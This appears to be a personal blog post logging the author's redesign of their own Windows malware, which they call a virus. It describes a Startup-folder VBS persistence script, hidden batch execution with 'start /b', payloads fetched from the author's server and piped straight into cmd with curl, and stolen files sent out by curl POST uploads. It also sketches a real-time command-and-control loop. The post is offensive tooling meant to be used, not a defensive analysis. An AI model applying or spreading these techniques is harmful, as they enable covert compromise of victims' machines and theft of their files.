
Some more time has passed away. Now it's 4 months since the debut of version 2 and I have been messing around with even more stuff and pretty much notice that I was complicate things wayyyy too much in the previous 2 versions, and that I have sort of fallen into several traps: designing a thing that shouldn't exist (aka subsystem optimization) and trying to control something that I don't understand. So, let's talk about it.

Version 3 pretty much has no similarity with the previous 2. Let's get that right out in the open. So, this is an opportunity to rewrite and rethink everything. But again, some of the ideas in the previous versions still have their merits. To reiterate, our virus should have 2 components: a base directory to rest within and a vbs script inside the startup folder to restart the virus every time the host computer restarts. Once the main script in the startup folder has been started, it wil download additional scripts from our website, then execute those and send the results back. From the second version, it's apparent that we need some sort of application to control all of these influx of data. If not then we will have to deal with the intricacies of the virus itself, and managing all the raw code is unpleasant at best, and a complete waste of time and evergy at worst.

But what's wrong with the previous versions? Let's start with version 1. There's this H.vbs file, which is supposed to run other batch scripts secretly and the batch code can sort of invoke that script to do that. There's this C.bat and C.txt, all to serve the purpose of counting how many cycles of shutdown and startup has taken place, to know when to download and when to mail the results back. D.bat is to download files, which actually invokes a PowerShell command to download it underneath. Z.vbs is a vbs script to zip the output folder, so we can sort of steal any files that we want via the S.vbs script. It is used to talk to yahoo's mail servers, authenticate a mail account we specifically created just to send the results out. On the core side of it, there's that SU.vbs that sits inside the startup folder, which will call SU.bat in the home folder, which will invoke D.bat or M3.bat depending on the count cycle number.

Now this is just too much going on, and there're fucking tight couplings in there. Scripts are expected to be there and to call each other in a convoluted way. Why are there 2 files in charge for only keeping track of which cycle it is? Why is there a separate D.bat? Some of these problems are solved in version 2, and that it sort of make the cycle from 4 days to 2 days per attack, and it cleans up things a bit, like merging D.bat into the home directory's entry point itself. Version 2 also has that nice little GUI, with a lot of tools there to interpret the results sent back, like turning a list of files into a json format, which then can be compared and merged with other directory structures. It also has this sort of quasi "compiler" as a quality of life means to further developing the virus, in particular, the init file so that I don't have to keep escaping the god damn quotes and dots and whatnot.

Overtime, I sort of have fallen into the trap of optimizing something that shouldn't exist, and I sort of haven't stared closely into this enough to realize that so much of this is unnecessary. And as I read more, it seems like there is a possibility to rethink all of this. So, let's now throw away stuff that shouldn't exist, shall we?

So, the concept of counting cycles of shutdown and startup, should we keep it? No. Why should we even keep track of it at all. Why shouldn't we just download and execute the payload, and then zip everything up and sending back the results. Why did we included the concept in the first place? Well, because I was afraid that there would be some hassle in downloading the script. It is because whenever I invoke the download command, it starts up a new process, and I can never quite know when the download has succeeded or not. So, wait until the next startup cycle seems to be a good idea.

To throw away that worry, we sort of have to use another tool that's synchronous with our virus thread. One day, when I was learning about docker, I saw someone just do "curl get.docker.com \| sh" to install docker. What this does is take the script in raw text that's on the docker website and pipes it into a shell. What struck me about this is 2 things: The command to install was insanely short. With it, the convenience to install also went through the roof. The other thing is that I don't have to worry about escape characters. In the original virus, the init script echos commands into files, and thus, those commands must be escaped in order for this to work. Now, I can just curl it and redirect that into another file with no hassle at all. It's a wonderful thing. So from now on, we can just curl the payload and execute it right away, using "curl payload \| cmd". Curl is also synchronous, so we have control over timing.

When we don't have to worry about escape characters, then we can essentially get rid of the compiling process altogether. Why compile when the initial reason to compile is to escape the characters? Why can't we just curl every additional scripts and that's pretty much it? Well, let's do that then. Next is the concept of zipping files. Why do we need this? To steal files, of course. How else would you do this instead of putting stolen files inside a folder, zipping it and sending an email back? Well, it sort of seems that I can send requests with files attached, because I can send my files over messenger or gmail. And while building version 2, I actually implemented that with the zipped directory structure. Let's see if we can do this... looking through curl's manual..... Yes we can! We can actually do something like 'curl -X POST --form "file=@filename.ext" url'. Woah great. Let's get rid of Z.vbs and S.vbs then.

How about H.vbs? Can we get rid of it? Can we start a new batch script from a batch script that will be hidden? Yes we can! "start /b script" does our job just as we wanted to. So, executing a batch script now looks like "start /b batchfile", and executing batch code now looks like "start /b cmd.exe /c code". We still need to start the first batch script hidden though, and this is sort of a limitation that I can't find a solution to. But, we can start the first batch script using vbs from startup, no problem at all, and H.vbs originally is just there so we can start other batch scripts. So, let's get rid of that too.

All of these might seem unnatural. Like, if you have not known about "curl" or "start", would you be able to still have this mental model and this idea? Well yes you can. When I built the first virus, I was thinking of a clear path to my goal, with the tools that I already know, then just sort of execute that goal and figure out the intricacies. A few weeks ago, I started think hard about how to get rid of stuff in version 1 and 2, and just google the capabilities that I want. Googling returns pretty much exactly what I wanted so I started working toward this version.

With these improvements, how does the attacking process looks like now?








Because we have deleted the counter feature, each viruses will now tell the application that it is alive, scan for new payloads, download those payloads and then starts a worker process to deal with that payload. After the payload is executed, the worker process will update the application with the results, and we can send any sort of files that we want back. This means that we can control the virus real time and can monitor it real time. And because the virus main thread forks worker threads to deal with the payload, if for some reason the payload gets nasty and is stopped by an antivirus, or for some error, the payload just pauses indefinitely, the virus couldn't care less and just moves on, freeing up to future attacks.
